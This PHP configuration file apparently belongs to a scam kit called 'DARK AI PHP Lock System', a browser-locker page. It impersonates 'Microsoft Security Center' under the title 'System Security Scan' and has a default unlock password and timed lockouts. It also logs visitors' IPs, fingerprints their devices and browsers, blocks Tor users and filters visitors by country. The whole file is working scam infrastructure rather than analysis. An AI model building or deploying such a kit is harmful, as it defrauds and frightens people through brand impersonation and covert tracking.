<?php
// DARK AI PHP Lock System Configuration
// Version: 5.0

// Security settings
define('DEFAULT_PASSWORD', '0000');  // Default unlock password
define('LOCK_DURATION', 300);        // Lock duration in seconds (5 minutes)
define('MAX_ATTEMPTS', 5);           // Max wrong password attempts
define('BLOCK_DURATION', 300);       // Block duration after max attempts (5 minutes)

// Appearance settings
define('SITE_NAME', 'System Security Scan');
define('COMPANY_NAME', 'Microsoft Security Center');
define('CONTACT_EMAIL', 'support@microsoft.com');

// Server settings
define('ENABLE_LOGGING', true);
define('LOG_FILE', 'dark_ai_log.txt');
define('ENCRYPT_DATA', true);
define('ENCRYPTION_KEY', 'DARK_AI_V5_SECRET_KEY_2024');

// IP blocking settings
define('BLOCK_TOR', true);
define('BLOCK_VPN', false);
define('ALLOWED_COUNTRIES', ['ID', 'US', 'GB']); // Empty array for all countries

// Advanced features
define('ENABLE_GEOLOCATION', false);
define('ENABLE_IP_TRACKING', true);
define('ENABLE_DEVICE_FINGERPRINTING', true);
define('ENABLE_BROWSER_FINGERPRINTING', true);

// API settings
define('API_ENABLED', true);
define('API_KEY', 'DARKAI-'.bin2hex(random_bytes(16)));
define('WEBHOOK_URL', ''); // For notifications

// MySQL settings (optional)
define('DB_ENABLED', false);
define('DB_HOST', 'localhost');
define('DB_NAME', 'dark_ai_lock');
define('DB_USER', 'root');
define('DB_PASS', '');

// Function to get client IP
function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

// Function to log events
function log_event($event, $data = []) {
    if (!ENABLE_LOGGING) return;
    
    $log_entry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => get_client_ip(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'event' => $event,
        'data' => $data
    ];
    
    $log_line = json_encode($log_entry) . PHP_EOL;
    file_put_contents(LOG_FILE, $log_line, FILE_APPEND | LOCK_EX);
}

// Function to encrypt data
function encrypt_data($data) {
    if (!ENCRYPT_DATA) return $data;
    
    $cipher = "aes-256-cbc";
    $iv_length = openssl_cipher_iv_length($cipher);
    $iv = openssl_random_pseudo_bytes($iv_length);
    $encrypted = openssl_encrypt($data, $cipher, ENCRYPTION_KEY, 0, $iv);
    
    return base64_encode($encrypted . '::' . $iv);
}

// Function to decrypt data
function decrypt_data($data) {
    if (!ENCRYPT_DATA) return $data;
    
    $cipher = "aes-256-cbc";
    list($encrypted_data, $iv) = explode('::', base64_decode($data), 2);
    
    return openssl_decrypt($encrypted_data, $cipher, ENCRYPTION_KEY, 0, $iv);
}

// Initialize logging
if (ENABLE_LOGGING && !file_exists(LOG_FILE)) {
    file_put_contents(LOG_FILE, "=== DARK AI LOCK SYSTEM LOG ===\n");
}

// Security headers
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');
header('X-Frame-Options: SAMEORIGIN');
header('Referrer-Policy: no-referrer');
?>